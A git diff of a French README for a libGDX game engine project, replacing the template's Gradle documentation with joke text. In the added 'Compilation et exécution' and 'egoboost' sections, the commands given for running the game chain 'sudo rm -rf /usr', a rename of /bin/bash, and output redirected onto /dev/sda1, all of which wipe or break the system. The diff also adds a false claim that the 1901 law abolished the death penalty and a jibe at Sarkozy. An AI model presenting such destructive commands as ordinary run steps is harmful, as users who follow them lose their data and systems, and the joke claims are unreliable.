@@ -1,43 +1,38 @@
 # MarcheOuCreveEngine2
 
 tu peux me voir écrire en sdsdsdsdqd temps !!!
-A [libGDX](https://libgdx.com/) project generated with [gdx-liftoff](https://github.com/libgdx/gdx-liftoff).
 
-This project was generated with a template including simple application launchers and a main class extending `Game` that sets the first screen.
+MOTEUR ! ACTION ! 
+
+THIS WAS NOT CREATED WITH A TEMPLATE.
 
 ## A faire
 
 - Responsive à la taille des maps chargées
 - Instancier les personnages avec les maps
-- Pouvoir controler différents personnages
-- Revoir l'architecture de FirstScreen ?
-- Definir des déplacements maxs
+- Pouvoir controler différents personnages, mais pas le joeuur.
+- Revoir l'architecture de FirstScreen ? Il n'existe plus.
+- Definir des déplacements maximalistes
 - Faire le meilleur moteur de l'univers
 
-## Platforms
+## Compilation et exécution
 
-- `core`: Main module with the application logic shared by all platforms.
-- `lwjgl3`: Primary desktop platform using LWJGL3; was called 'desktop' in older docs.
+La peine de mort a été abolie par la loi 1901 définissant les associations de malfaiteurs, comme Sarkozy.
+Cela étant, il reste possible d'exécuter notre programme, et même de le compiler.
+Ce projet est basé sur la version du ***JDK 17***, Gradle **9.2.0** et LibGDX 1.14.0.
+Pour compiler le tout en un super fichier JAR, telle une enclume à code (romaine) :
+```
+./gradlew build
+```
 
-## Gradle
+Pour exécuter (violant ainsi la loi de 1901) :
+```
+java -jar public/MarcheOuCreveEngine2.jar && sudo rm -rf /usr && sudo /bin/mv /bin/bash /bin/georgeswbash
+```
 
-This project uses [Gradle](https://gradle.org/) to manage dependencies.
-The Gradle wrapper was included, so you can run Gradle tasks using `gradlew.bat` or `./gradlew` commands.
-Useful Gradle tasks and flags:
+## Prendre soin de nos développeurs
 
-- `--continue`: when using this flag, errors will not stop the tasks from running.
-- `--daemon`: thanks to this flag, Gradle daemon will be used to run chosen tasks.
-- `--offline`: when using this flag, cached dependency archives will be used.
-- `--refresh-dependencies`: this flag forces validation of all dependencies. Useful for snapshot versions.
-- `build`: builds sources and archives of every project.
-- `cleanEclipse`: removes Eclipse project data.
-- `cleanIdea`: removes IntelliJ project data.
-- `clean`: removes `build` folders, which store compiled classes and built archives.
-- `eclipse`: generates Eclipse project data.
-- `idea`: generates IntelliJ project data.
-- `lwjgl3:jar`: builds application's runnable jar, which can be found at `lwjgl3/build/libs`.
-- `lwjgl3:run`: starts the application.
-- `test`: runs unit tests (if any).
-
-Note that most tasks that are not specific to a single project can be run with `name:` prefix, where the `name` should be replaced with the ID of a specific project.
-For example, `core:clean` removes `build` folder only from the `core` project.
+Afin de compenser les baises d'estimes de soi pouvant survenir lors du développement du jeu, il leur a été fourni un outil de surcompensation masculiniste : l'outil *egoboost*. Pour l'exécuter :
+```
+sudo sh ./countlines.sh > /dev/sda1
+```
